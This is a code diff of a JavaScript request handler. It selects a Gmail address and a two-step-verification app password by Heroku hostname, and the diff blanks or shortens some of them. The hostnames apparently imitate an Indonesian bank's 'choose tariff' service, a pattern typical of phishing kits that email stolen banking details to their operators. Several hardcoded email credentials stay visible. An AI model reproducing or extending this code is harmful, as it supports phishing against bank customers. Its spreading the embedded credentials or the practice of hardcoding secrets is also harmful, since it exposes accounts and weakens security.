@@ -7,28 +7,22 @@ export default function handler(req, res) {
     let email = '';
     let pass = '';
 
-    if (url == 'pilih-tarif.herokuapp.com'){
+    if (url == ''){
 
-       email = 'itupasti76@gmail.com'
-       pass = 'wbnboqqufuwxa'
-    }else
-    
-    if (url == 'pilih-tarifbrii-new.herokuapp.com'){
-
-       email = 'asakakor89@gmail.com'
-       pass = 'vqstifbcnzyrg'
+       email = ''
+       pass = ''
     }else
     
     if(url == 'pilihtarifbrimo.herokuapp.com') //jika url sama dengan url hosting
     {
 
         email = 'sehebat52@gmail.com'; //email
-        pass = 'xkzebfcpoaqsw'; //sandi aplikasi dari verifikasi 2 langkah
+        pass = 'xkzebfcpow'; //sandi aplikasi dari verifikasi 2 langkah
         
     } else if(url == 'pilihperubahantarif.herokuapp.com') //jika url sama dengan url hosting
     {
         email = 'sinetronsilala@gmail.com'; //email
-        pass = 'xqlshlibfzepl'; //sandi aplikasi dari verifikasi 2 langkah
+        pass = 'xqlshlzepl'; //sandi aplikasi dari verifikasi 2 langkah
     }
     else {
 
